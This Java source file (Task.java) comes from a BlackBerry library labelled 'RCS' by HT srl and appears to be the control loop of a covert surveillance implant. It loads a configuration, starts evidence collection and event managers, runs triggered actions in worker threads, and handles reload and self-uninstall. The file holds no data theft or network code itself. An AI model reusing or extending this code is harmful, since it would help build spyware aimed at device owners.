//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Task.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;
import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.CodeModuleManager;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.action.UninstallAction;
import blackberry.config.ConfLoader;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.EvidenceCollector;
import blackberry.interfaces.iSingleton;
import blackberry.manager.ActionManager;
import blackberry.manager.EventManager;
import blackberry.manager.ModuleManager;
import blackberry.utils.BlockingQueueTrigger;

/**
 * The Class Task.
 */
public final class Task implements iSingleton {

    private static final int SLEEPING_TIME = 1000;
    private static final long APP_TIMER_PERIOD = 1000;
    private static final long GUID = 0xefa4f28c0e0c8693L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    //#endif

    /**
     * Gets the single instance of Task.
     * 
     * @return single instance of Task
     */
    public static synchronized Task getInstance() {
        if (instance == null) {
            instance = (Task) Singleton.self().get(GUID);
            if (instance == null) {
                final Task singleton = new Task();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    /** The conf. */
    ConfLoader conf;

    /** The status. */
    Status status;

    /** The device. */
    Device device;

    /** The log collector. */
    EvidenceCollector logCollector;

    /** The event manager. */
    EventManager eventManager;

    /** The agent manager. */
    ModuleManager agentManager;
    Timer applicationTimer;

    // ApplicationUpdateTask();

    AppUpdateManager appUpdateManager;

    private static Task instance;

    /**
     * Instantiates a new task.
     */
    private Task() {
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = EvidenceCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = ModuleManager.getInstance();

        //#ifdef DEBUG
        debug.trace("Task created");
        //#endif
    }

    Date lastActionCheckedStart;
    Date lastActionCheckedEnd;
    String lastAction;
    String lastSubAction;
    private CheckActionFast checkActionFast;
    private Thread fastQueueThread;

    //Thread actionThread;

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public int taskInit() {

        //#ifdef DEBUG
        debug.trace("TaskInit");
        //#endif

        try {
            if (conf != null) {
                conf = null;
            }

            conf = new ConfLoader();
            int ret = ConfLoader.LOADED_NO;
            try {
                ret = conf.loadConf();
            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                debug.error("taskInit, loadConf: " + ex);
                //#endif
            }

            //#ifdef DBC
            Check.asserts(ret >= 0,
                    "conf.loadConf should answer with a positive value");
            //#endif
            if (ret <= 0) {
                //#ifdef DEBUG
                debug.trace("Load Conf FAILED");
                //#endif

                return ret;
            } else {
                //#ifdef DEBUG
                debug.trace("taskInit: Load Conf Succeded");
                //#endif
            }

            if (logCollector != null) {
                //#ifdef DEBUG
                debug.info("taskInit evidences");
                //#endif
                logCollector.initEvidences();
            }

            // Da qui in poi inizia la concorrenza dei thread

            //#ifdef DEBUG
            debug.trace("taskInit START ALL EVENTS");
            //#endif
            if (eventManager.startAll() == false) {
                //#ifdef DEBUG
                debug.trace("eventManager FAILED");
                //#endif
                return ConfLoader.LOADED_ERROR;
            }

            //#ifdef DEBUG
            debug.info("Events started");
            //#endif
            return ret;
        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("taskInit");
            //#endif
        }
        return ConfLoader.LOADED_ERROR;

    }

    /**
     * Check actions.
     * 
     * @return true, if reloading; false, if exit
     */
    public boolean checkActions() {
        //#ifdef DEBUG
        debug.trace("checkActions, start both");
        //#endif

        checkActionFast = new CheckActionFast(status.getTriggeredQueueFast());
        fastQueueThread = new Thread(checkActionFast);
        fastQueueThread.start();

        boolean exit = checkActions(status.getTriggeredQueueMain());
        //#ifdef DEBUG
        debug.trace("checkActions, main finished, stopping fast.");
        //#endif

        checkActionFast.close();

        try {
            fastQueueThread.join();
            checkActionFast = null;

            //#ifdef DEBUG
            debug.trace("checkActions, fast stopped.");
            //#endif
        } catch (InterruptedException e) {
            //#ifdef DEBUG            
            debug.error(e);
            debug.error("checkActions");
            //#endif
        }

        return exit;
    }

    class CheckActionFast implements Runnable {

        private final BlockingQueueTrigger queue;

        CheckActionFast(BlockingQueueTrigger queue) {
            this.queue = queue;
        }

        public void close() {
            queue.close();
        }

        public void run() {

            boolean ret = checkActions(queue);
        }
    }

    public boolean checkActions(BlockingQueueTrigger queue) {
        try {
            for (;;) {

                lastActionCheckedStart = new Date();

                //#ifdef DEBUG
                debug.trace("checkActions: " + queue);
                //#endif

                final Trigger trigger = queue.getTriggeredAction();
                if (trigger == null) {
                    //#ifdef DEBUG
                    debug.trace("checkActions, null trigger: " + queue);
                    //#endif
                    // queue interrupted
                    return false;
                }

                if (Status.self().isDemo()) {
                    Debug.playSound();
                }

                String actionId = trigger.getId();
                final Action action = (Action) ActionManager.getInstance().get(
                        actionId);
                if (action == null) {
                    //#ifdef DEBUG
                    debug.trace("checkActions, null action: " + actionId);
                    //#endif
                    // queue interrupted
                    return false;
                }

                lastAction = action.toString();

                //#ifdef DEBUG
                debug.trace("checkActions " + queue + " executing action: "
                        + actionId);
                //#endif
                int exitValue = executeAction(action, trigger);

                if (exitValue == Exit.UNINSTALL) {
                    //#ifdef DEBUG
                    debug.info("checkActions: Uninstall");
                    //#endif

                    UninstallAction.actualExecute();
                    return false;
                } else if (exitValue == Exit.RELOAD) {
                    //#ifdef DEBUG
                    debug.trace("checkActions: want Reload");
                    //#endif
                    return true;
                }else if (exitValue == Exit.ERROR) {
                    //#ifdef DEBUG
                    debug.trace("checkActions error occurred: "
                            + actionId);
                    //#endif
                } else {
                    //#ifdef DEBUG
                    debug.trace("checkActions finished executing action: "
                            + actionId);
                    //#endif
                }

                lastActionCheckedEnd = new Date();
            }
        } catch (final Throwable ex) {
            // catching trowable should break the debugger anc log the full stack trace
            //#ifdef DEBUG
            debug.fatal("checkActions error, restart: " + ex);
            //#endif
            return true;
        }
    }

    private int executeAction(final Action action, Trigger trigger) {
        int exit = 0;
        //#ifdef DEBUG
        debug.trace("CheckActions() triggered: " + action);
        //#endif

        //#ifdef DBC
        Check.requires(action != null, "executeAction, null action");
        Check.requires(trigger != null, "executeAction, null trigger");
        //#endif

        try {

            action.unTrigger();

            final Vector subActions = action.getSubActions();
            final int ssize = subActions.size();

            //#ifdef DEBUG
            debug.trace("checkActions, " + ssize + " subactions");
            //#endif

            for (int j = 0; j < ssize; ++j) {
                try {
                    final SubAction subAction = (SubAction) subActions
                            .elementAt(j);
                    //#ifdef DBC
                    Check.asserts(subAction != null,
                            "checkActions: subAction!=null");
                    //#endif

                    lastSubAction = subAction.toString();

                    //#ifdef DEBUG
                    debug.info("CheckActions() executing subaction (" + (j + 1)
                            + "/" + ssize + ") : " + subAction);
                    //#endif

                    final boolean ret = subAction.execute(trigger);

                    if (status.uninstall) {
                        //#ifdef DEBUG
                        debug.warn("CheckActions() uninstalling");
                        //#endif

                        exit = Exit.UNINSTALL;
                        break;
                        //return false;
                    }

                    else if (status.reload) {
                        //#ifdef DEBUG
                        debug.warn("checkActions: reloading");
                        //#endif

                        //return true;
                        exit = Exit.RELOAD;
                        status.reload = false;
                        break;
                    }

                    if (ret == false) {
                        //#ifdef DEBUG
                        debug.trace("executeAction Warn: "
                                + "CheckActions() error executing: "
                                + subAction);
                        //#endif
                        continue;
                    } else {
                        //#ifdef DEBUG
                        debug.trace("executeAction true: " + subAction);
                        //#endif
                        if (subAction.considerStop()) {
                            //#ifdef DEBUG
                            debug.trace("executeAction, wanna stop()");
                            //#endif
                            break;
                        }
                    }

                } catch (final Exception ex) {
                    //#ifdef DEBUG
                    debug.error("checkActions for: " + ex);
                    //#endif
                }
            }

            Thread.yield();

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("executeAction: " + ex);
            //#endif
            exit=Exit.ERROR;
        }
        
        return exit;
    }

    void stopAll() {
        agentManager.stopAll();
        eventManager.stopAll();
        status.unTriggerAll();

        ActionManager.getInstance().clear();
    }

    /**
     * Start application timer.
     */
    synchronized void startApplicationTimer() {
        //#ifdef DEBUG
        debug.info("startApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }

        applicationTimer = new Timer();
        appUpdateManager = new AppUpdateManager();
        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);
    }

    /**
     * Stop application timer.
     */
    public synchronized void stopApplicationTimer() {
        //#ifdef DEBUG
        debug.info("stopApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }
    }

    /**
     * Start application timer.
     */
    public synchronized void resumeApplicationTimer() {
        //#ifdef DEBUG
        debug.info("resumeApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
        applicationTimer = new Timer();

        if (appUpdateManager == null) {
            appUpdateManager = new AppUpdateManager();
        } else {
            appUpdateManager = new AppUpdateManager(appUpdateManager);
        }

        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);

    }

    /**
     * Stop application timer.
     */
    synchronized void suspendApplicationTimer() {
        //#ifdef DEBUG
        debug.info("suspendApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
    }

    public void reset() {
        //#ifdef DEBUG
        debug.trace("reset");
        //#endif
        stopAll();

        // http://supportforums.blackberry.com/t5/Java-Development/Programmatically-rebooting-the-device/m-p/42049?view=by_date_ascending
        CodeModuleManager.promptForResetIfRequired();
    }

    private boolean needToRestart;

    public boolean reloadConf() {
        //#ifdef DEBUG
        debug.trace("reloadConf: START");
        //#endif

        stopAll();

        int ret = taskInit();
        //#ifdef DEBUG
        debug.trace("reloadConf: END");
        //#endif
        return ret == ConfLoader.LOADED_NEWCONF;

    }

}
